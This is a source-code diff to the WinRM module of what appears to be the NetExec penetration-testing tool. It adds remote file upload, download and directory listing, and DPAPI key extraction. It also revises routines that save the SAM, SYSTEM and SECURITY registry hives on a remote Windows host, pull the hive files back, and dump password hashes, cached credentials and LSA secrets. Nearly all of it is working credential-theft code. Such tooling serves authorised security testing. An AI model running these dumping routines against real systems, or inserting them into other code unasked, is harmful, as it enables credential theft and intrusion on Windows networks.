@@ -1,25 +1,27 @@
 import os
 import base64
+import binascii
 import requests
 import urllib3
 import logging
+import ntpath
 import xml.etree.ElementTree as ET
 
-from datetime import datetime
 from pypsrp.wsman import NAMESPACES
 from pypsrp.client import Client
 from pypsrp.powershell import PSDataStreams
 from termcolor import colored
 
+from dploot.lib.network.winrm import WINRMTarget as Target
 from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
-from nxc.helpers.misc import gen_random_string
-from nxc.helpers.ntlm_parser import parse_challenge
+from nxc.helpers.dpapi import DPAPITriage
+from nxc.helpers.misc import gen_random_string, sanitize_dns
+from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
-from nxc.paths import NXC_PATH
 
 urllib3.disable_warnings()
 
@@ -29,7 +31,6 @@ class winrm(connection):
         self.domain = ""
         self.targedDomain = ""
         self.server_os = None
-        self.output_filename = None
         self.endpoint = None
         self.lmhash = ""
         self.nthash = ""
@@ -37,6 +38,10 @@ class winrm(connection):
         self.challenge_header = None
         self.targetDomain = None
         self.no_ntlm = False
+        self.dpapi_system_key = None
+        self.no_da = None
+
+        self._dpapi_triage = None
 
         connection.__init__(self, args, db, host)
 
@@ -63,19 +68,28 @@ class winrm(connection):
             self.no_ntlm = True
             return False
 
-        self.targetDomain = self.domain = ntlm_info["domain"]
-        self.hostname = ntlm_info["hostname"]
+        dns_hostname = ntlm_info["dns_hostname"] or ""
+        hostname = ntlm_info["hostname"] or dns_hostname.split(".", 1)[0] or self.host
+        domain = ntlm_info["domain"] or (dns_hostname.split(".", 1)[1] if "." in dns_hostname else self.host)
+        self.hostname = sanitize_dns(hostname, self.logger)
+        self.targetDomain = self.domain = sanitize_dns(domain, self.logger)
         self.server_os = ntlm_info["os_version"]
         self.logger.extra["hostname"] = self.hostname
 
-        self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)
+        try:
+            self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)
+        except Exception as e:
+            self.logger.debug(f"Error adding host to database: {e!s}")
 
         if self.args.domain:
             self.domain = self.args.domain
         if self.args.local_auth:
             self.domain = self.hostname
 
-        self.output_filename = os.path.expanduser(f"{NXC_PATH}/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))
+        if not self.kdcHost and self.domain and self.domain == self.targetDomain:
+            result = self.resolver(self.domain)
+            self.kdcHost = result["host"] if result else None
+            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")
 
     def print_host_info(self):
         self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
@@ -292,6 +306,40 @@ class winrm(connection):
         if get_output:
             return result
 
+    def get_file(self, remote_path=None, download_path=None):
+        remote_path = remote_path if remote_path else self.args.get_file[0]
+        local_path = download_path if download_path else self.args.get_file[1]
+
+        # Do a bit of smart handling for the local file path
+        if local_path.endswith("/"):
+            local_path += ntpath.basename(remote_path)
+        try:
+            self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')
+            self.conn.fetch(remote_path, local_path)
+            self.logger.success(f"File {remote_path} has been saved to {local_path}")
+        except Exception as e:
+            self.logger.fail(f"Failed to get file {remote_path}, error: {e!s}")
+
+    def put_file(self, local_path=None, remote_path=None):
+        local_path = local_path if local_path else self.args.put_file[0]
+        remote_path = remote_path if remote_path else self.args.put_file[1]
+
+        # Do a bit of smart handling for the remote file path
+        remote_path += os.path.basename(local_path) if remote_path.endswith(("\\", "/")) else ""
+        try:
+            self.logger.display(f'Uploading "{local_path}" to "{remote_path}"')
+            self.conn.copy(local_path, remote_path)
+            self.logger.success(f"File {local_path} has been uploaded to {remote_path}")
+        except Exception as e:
+            self.logger.fail(f"Failed to put file {local_path} to {remote_path}, error: {e!s}")
+
+    def dir(self, directory=None):
+        directory = directory if directory else self.args.dir
+        out = self.execute(f"dir {directory}", True)
+        if out is not None:
+            for line in out.splitlines():
+                self.logger.highlight(line.rstrip())
+
     # Dos attack prevent:
     # if someboby executed "reg save HKLM\sam C:\windows\temp\sam" before, but didn't remove "C:\windows\temp\sam" file,
     # when user execute the same command next time, in tty shell, the prompt will ask "File C:\windows\temp\sam already exists. Overwrite (Yes/No)?"
@@ -303,10 +351,11 @@ class winrm(connection):
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="sam")
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", self.output_filename + ".sam")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", self.output_filename + ".system")
+            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
+            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
             self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
             if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
@@ -316,26 +365,28 @@ class winrm(connection):
             else:
                 self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
         else:
-            local_operations = LocalOperations(f"{self.output_filename}.system")
+            self.logger.display("Dumping SAM hashes")
+            local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
             SAM = SAMHashes(
-                f"{self.output_filename}.sam",
+                f"{output_filename}.sam",
                 boot_key,
                 isRemote=None,
                 perSecretCallback=lambda secret: self.logger.highlight(secret),
             )
             SAM.dump()
-            SAM.export(f"{self.output_filename}.sam")
+            SAM.export(output_filename)
 
-    def lsa(self):
+    def lsa(self, quiet=False):
         security_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="lsa")
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{self.output_filename}.security")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{self.output_filename}.system")
+            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
             self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
             if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
@@ -345,14 +396,48 @@ class winrm(connection):
             else:
                 self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
         else:
-            local_operations = LocalOperations(f"{self.output_filename}.system")
+            if not quiet:
+                self.logger.display("Dumping LSA secrets")
+            local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
+
+            def lsa_secret_callback(_, secret):
+                if "dpapi_machinekey" not in secret:
+                    if not quiet:
+                        self.logger.highlight(secret)
+                else:
+                    correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
+                    self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
+                    if not quiet:
+                        self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
+                        self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
             LSA = LSASecrets(
-                f"{self.output_filename}.security",
+                f"{output_filename}.security",
                 boot_key,
                 None,
                 isRemote=None,
-                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+                perSecretCallback=lsa_secret_callback
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
+
+    def dpapi(self):
+        self.dpapi_triage.triage_dpapi()
+
+    @property
+    def dpapi_triage(self) -> DPAPITriage:
+        if self._dpapi_triage is not None:
+            return self._dpapi_triage
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            address=self.host,
+            port=self.port,
+            ssl=self.ssl,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+        )
+
+        self._dpapi_triage = DPAPITriage(self, target)
+        return self._dpapi_triage
